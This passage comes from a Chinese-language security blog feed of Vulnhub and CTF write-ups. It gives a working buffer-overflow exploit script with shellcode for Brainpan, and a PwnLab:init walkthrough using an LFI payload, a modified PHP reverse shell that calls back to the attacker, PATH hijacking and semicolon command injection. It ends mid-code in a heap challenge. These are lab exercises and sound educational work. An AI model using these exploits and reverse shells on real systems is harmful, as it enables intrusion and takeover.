        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><code>Vulnhub</code>靶机<code>Brainpan</code>系列的第一台。整体难度中等。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先找靶机IP：</p><p><img src="/img/Brainpan1/Brainpan1.png"></p><p>扫描靶机开放端口：</p><p><img src="/img/Brainpan1/Brainpan2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>9999端口：</p><p><img src="/img/Brainpan1/Brainpan3.png"></p><p>看起来需要一个密码，只能先跳过。</p><p>10000端口是http的服务，浏览器看上去只是一张图片的静态页面：</p><p><img src="/img/Brainpan1/Brainpan4.png"></p><p>目录扫描发现有个bin目录：</p><p><img src="/img/Brainpan1/Brainpan5.png"></p><p>访问bin目录，有个exe文件：</p><p><img src="/img/Brainpan1/Brainpan6.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>通过IDA逆向之后发现这是9999端口运行的程序：</p><p><img src="/img/Brainpan1/Brainpan7.png"></p><p>在程序中发现一个<code>get_reply</code>函数：</p><p><img src="/img/Brainpan1/Brainpan8.png"></p><p>在函数中可以看到调用strcpy，而在主函数中&amp;Dest长度可以到1000字节，get_reply函数中Source只有0x208字节即520字节。所以这里存在栈溢出漏洞，当填充了<code>520(Source_data)+4(EBP)</code>总共524字节的数据之后就可以控制函数的返回地址。</p><p>由于程序中没有可以直接getshell的函数，所以需要我们将shellcode写入的buf中，通过jmp esp命令控制程序跳转到buf执行命令。</p><p>在程序中找到311712F3的地址有jmp esp指令，再通过msfvenom生成payload：</p><p><img src="/img/Brainpan1/Brainpan9.png"></p><p>最终的利用脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&#x27;172.16.83.3&#x27;</span></span><br><span class="line">target_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding with &#x27;a&#x27;</span></span><br><span class="line">padding = <span class="string">&#x27;\x61&#x27;</span> * <span class="number">524</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of &#x27;jmp esp&#x27; command - 0x311712F3</span></span><br><span class="line">jmp_esp = <span class="string">&#x27;\xF3\x12\x17\x31&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x90&quot;</span> * <span class="number">30</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\x23\x22\x77\xf6\xd9\xe1\xd9\x74\x24\xf4\x5a\x33&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x7a\x12\x03\x7a\x12\x83\xc9\xde\x95&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x03\x3c\xc4\xad\x0f\x6d\xb9\x02\xba\x93\xb4\x44\x8a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf5\x0b\x06\x78\xa0\x23\x38\xb2\xd2\x0d\x3e\xb5\xba&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\xd0\x16\x38\x52\xd3\x98\x2d\xfe\x5a\x79\xfd\x98&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x2b\xae\xd7\xae\x42\xb1\xd5\x31\x06\x59\x88\x1e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd4\xf1\x3c\x4e\x35\x63\xd4\x19\xaa\x31\x75\x93\xcc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x05\x72\x6e\x8e&quot;</span></span><br><span class="line"></span><br><span class="line">payload = padding + jmp_esp + buf</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((target_ip, target_port))</span><br><span class="line"></span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(payload)</span><br></pre></td></tr></table></figure><p>运行脚本之后就可以获取反弹shell：</p><p><img src="/img/Brainpan1/Brainpan10.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>根据之前靶机题权最简单的方式，直接查看sudo权限，提示我们可以以root权限运行<code>/home/anansi/bin/anansi_util</code>：</p><p><img src="/img/Brainpan1/Brainpan11.png"></p><p>sudo执行之后根据命令提示可以直接接命令，所以当接上<code>/bin/bash</code>命令之后就可以获得root权限的shell。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - PwnLab：init の Write-Up</title>
      <link href="/2020/10/22/PwnLab-init/"/>
      <url>/2020/10/22/PwnLab-init/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><code>Vulnhub</code>靶机<code>PwnLab：init</code>的练习记录。整体难度不高，最终目的是拿到<code>/root/flag.txt</code>文件。</p><span id="more"></span><h2 id="Gathering-Information"><a href="#Gathering-Information" class="headerlink" title="Gathering Information"></a>Gathering Information</h2><p>首先找下靶机地址：</p><p><img src="/img/PwnLab_init/PwnLab1.png"></p><p>扫描一下靶机的开放端口和服务：</p><p><img src="/img/PwnLab_init/PwnLab2.png"></p><h2 id="Game-Start"><a href="#Game-Start" class="headerlink" title="Game Start"></a>Game Start</h2><p>先看下80端口的服务：</p><p><img src="/img/PwnLab_init/PwnLab3.png"></p><p>Login界面是一个看起来很简陋的登陆界面：</p><p><img src="/img/PwnLab_init/PwnLab4.png"></p><p>尝试对登录接口爆破和SQL注入均无结果。</p><p>但是针对界面的URL：<code>http://172.16.83.142/?page=login和http://172.16.83.142/?page=upload</code>的形式，猜测可能存在文件包含的问题。</p><p>结合<code>nikto</code>给出的信息：</p><p><img src="/img/PwnLab_init/PwnLab5.png"></p><p><code>/config.php</code>文件存在可能泄露数据库的信息，但是直接访问是没有数据的。</p><p>接下来就尝试读取<code>/config.php</code>文件的内容，详细内容可参考这篇文章<a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a>。最终通过<code>php://filter</code>实现内容读取，这个技巧也是CTF中经常用到的。</p><p>最终payload是这样的：<code>http://172.16.83.142/?page=php://filter/read=convert.base64-encode/resource=config</code>（注意不用加.php后缀）</p><p><img src="/img/PwnLab_init/PwnLab6.png"></p><p>base64解码出来之后的结果中果然含有数据库的信息：</p><p><img src="/img/PwnLab_init/PwnLab7.png"></p><p>同样的方法我们可以获得<code>login.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$luser</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$lpass</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$luser</span>, <span class="variable">$lpass</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_Result</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;num_rows == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$luser</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=upload&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Login failed.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">&lt;label&gt;Username: &lt;/label&gt;&lt;input id=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;test&quot;</span> name=<span class="string">&quot;user&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">&lt;label&gt;Password: &lt;/label&gt;&lt;input id=<span class="string">&quot;pass&quot;</span> type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pass&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及<code>upload.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123; <span class="keyword">die</span>(<span class="string">&#x27;You must be log in.&#x27;</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;post&#x27;</span> enctype=<span class="string">&#x27;multipart/form-data&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;file&#x27;</span> name=<span class="string">&#x27;file&#x27;</span> id=<span class="string">&#x27;file&#x27;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;Upload&#x27;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$filename</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$filetype</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line"><span class="variable">$file_ext</span>  = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$imageinfo</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.gif&quot;</span>,<span class="string">&quot;.png&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$whitelist</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Not allowed extension, please upload images only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filetype</span>,<span class="string">&#x27;image&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Error 001&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpg&#x27;</span>&amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Error 002&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr_count</span>(<span class="variable">$filetype</span>, <span class="string">&#x27;/&#x27;</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Error 003&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])).<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$uploadfile</span>.<span class="string">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Error 4&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过泄露的数据库账号密码可以通过root远程登录mysql数据库：</p><p><img src="/img/PwnLab_init/PwnLab8.png"></p><p>根据提示在Users表中找到了3个账号。</p><p><img src="/img/PwnLab_init/PwnLab9.png"></p><p>密码很明显是base64编码的，解码之后得到3对账户和密码：</p><ul><li><p>kent&#x2F;JWzXuBJJNy</p></li><li><p>mike&#x2F;SIfdsTEn6I</p></li><li><p>kane&#x2F;iSv5Ym2GRo</p></li></ul><p>登录系统之后直接跳转到upload界面，允许上传文件。但是通过上面我们down下来的<code>upload.php</code>源码来看，上传文件是后端的白名单验证后缀，而且上传上去之后会改文件名再添加后缀。但是只是检查了<code>imageinfo</code>，那可以伪造一个文件头加后缀就可以了。</p><p>就在kali自带的php webshell里挑一个<code>php-reverse-shell.php</code>改一下就可以。</p><p><img src="/img/PwnLab_init/PwnLab10.png"></p><p>先加个文件头：</p><p><img src="/img/PwnLab_init/PwnLab11.png"></p><p>再把反连IP和端口改成自己的：</p><p><img src="/img/PwnLab_init/PwnLab12.png"></p><p>最后文件名加上<code>.gif</code>的后缀，就可以成功上传：</p><p><img src="/img/PwnLab_init/PwnLab13.png"></p><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><p>但是又出现了新的问题，我们没法访问这个图片……</p><p>在网上找了一些提示之后才想起来，我们下载了<code>config.php</code>，<code>login.php</code>，<code>upload.php</code>3个源码文件，但是还有主页的源码没看。再次利用php伪协议读取主页源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">//Multilingual. Not implemented yet.</span></span><br><span class="line"><span class="meta">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span></span><br><span class="line"><span class="meta">if (isset($_COOKIE[&#x27;lang&#x27;]))</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">include(&quot;lang/&quot;.$_COOKIE[&#x27;lang&#x27;]);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">// Not implemented yet.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/pwnlab.png&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">[ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?page=login&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?page=upload&quot;</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ]</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">if (isset($_GET[&#x27;page&#x27;]))</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">include($_GET[&#x27;page&#x27;].&quot;.php&quot;);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">else</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到cookie里有个有趣的参数<code>lang</code>可以实现访问任意文件：</p><p><img src="/img/PwnLab_init/PwnLab14.png"></p><p>于是利用这个漏洞触发webshell反弹shell:</p><p><img src="/img/PwnLab_init/PwnLab15.png"></p><p>可以看到利用Burp发包之后kali就接收到里反弹的shell。通过下面的命令即可转换成交互式shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;__import__(&quot;pty&quot;).spawn(&quot;/bin/bash&quot;)’</span></span><br></pre></td></tr></table></figure><h2 id="Exploring"><a href="#Exploring" class="headerlink" title="Exploring"></a>Exploring</h2><p>现在我们已经拿到目标机器的shell，下一步就是寻找有价值的信息。在<code>home</code>下发现4个用户：</p><p><img src="/img/PwnLab_init/PwnLab16.png"></p><p>尝试切换到这几个用户，<code>kent</code>下什么也没有：</p><p><img src="/img/PwnLab_init/PwnLab17.png"></p><p><code>mike</code>的密码不对：</p><p><img src="/img/PwnLab_init/PwnLab18.png"></p><p>在<code>kane</code>目录下找到一个奇怪的文件<code>msgmike</code>：</p><p><img src="/img/PwnLab_init/PwnLab19.png"></p><p>是个可执行文件且存在<code>setuid</code>，<code>setgid</code>。执行发现调用了<code>cat</code>命令：</p><p><img src="/img/PwnLab_init/PwnLab20.png"></p><p>接下来将<code>cat</code>命令换成<code>bash</code>：</p><p><img src="/img/PwnLab_init/PwnLab21.png"></p><p>通过<code>export PATH=.:$PATH</code>命令修改一下系统路径PATH，再次运行<code>msgmike</code>就可以得到<code>mike</code>的bash：</p><p><img src="/img/PwnLab_init/PwnLab22.png"></p><p>回到<code>mike</code>的目录下，有个新的<code>msg2root</code>的程序，根据名字感觉是提权到<code>root</code>权限的东西：</p><p><img src="/img/PwnLab_init/PwnLab23.png"></p><p>但是看起来就是简单的将输入变成输出：</p><p><img src="/img/PwnLab_init/PwnLab24.png"></p><p>联想到<code>PwnLab</code>的名字，通过<code>scp</code>命令将这个程序传回本地，逆向分析一下：</p><p><img src="/img/PwnLab_init/PwnLab25.png"></p><p><code>msg2root</code>逆向后的主函数伪代码如下：</p><p><img src="/img/PwnLab_init/PwnLab26.png"></p><p>其实是个很简单的程序，将输入写入到<code>/root/message.txt</code>中，然后<code>system</code>执行。那通过<code>;</code>截断就可以绕过了。</p><p><img src="/img/PwnLab_init/PwnLab27.png"></p><h2 id="Finished"><a href="#Finished" class="headerlink" title="Finished"></a>Finished</h2><p>可以看到我们已经得到了<code>root</code>的权限，最后就是去根目录下读<code>flag.txt</code>文件了：</p><p><img src="/img/PwnLab_init/PwnLab28.png"></p><p>完结，撒花～～</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - ItemBoard の Write-Up</title>
      <link href="/2020/10/20/ItemBoard/"/>
      <url>/2020/10/20/ItemBoard/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>一道比较简单的堆溢出的题目，主要是配合测试下小工具<a href="https://github.com/Coldwave96/LibcOffset">LibcOffset</a>，一个用来计算各个版本的libc文件main_arena offset的Python脚本。</p><span id="more"></span><p>程序运行截图：看起来是一道典型的堆溢出题目</p><p><img src="/img/ItemBoard/ItemBoard1.png"></p><p>checksec：64位程序，有DEP和ASLR保护机制</p><p><img src="/img/ItemBoard/ItemBoard2.png"></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>将程序通过IDA Pro逆向查看伪代码，首先是main函数：</p><p><img src="/img/ItemBoard/ItemBoard3.png"></p><p>new_item函数创建新的item：</p><p><img src="/img/ItemBoard/ItemBoard4.png"></p><p>list_item列出所有的item：</p><p><img src="/img/ItemBoard/ItemBoard5.png"></p><p>show_item展示具体的item：</p><p><img src="/img/ItemBoard/ItemBoard6.png"></p><p>remove_item函数删除item：</p><p><img src="/img/ItemBoard/ItemBoard7.png"></p><p>通过初步的分析发现代码中存在两处问题：</p><ul><li><p>一是在new_item函数中buf的大小是1024，但是函数中并没有限制content_len的大小，所以当输入内容超过buf大小之后会造成缓冲区溢出，被利用构造ROP Chain。</p></li><li><p>二是在remove_item函数中本该释放item指针的set_null函数实际上却是个空函数，所以实际上这个函数并没有什么用，存在UAF漏洞。</p></li></ul><p>结合题目给出了libc.so文件，大体上的思路是利用UAF泄露基地址和libc地址，进而获取system函数的地址。再利用UAF或者ROP Chain执行system函数getshell。</p><p>利用自己编写的小工具<a href="https://github.com/Coldwave96/LibcOffset">LibcOffset</a>查询本地以及题目给的libc文件的main_arena_offset。</p><p>本地调试环境：</p><p><img src="/img/ItemBoard/ItemBoard8.png"></p><p>题目给的是glibc 2.19版本的：</p><p><img src="/img/ItemBoard/ItemBoard9.png"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这里只记录通过UAF get shell的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 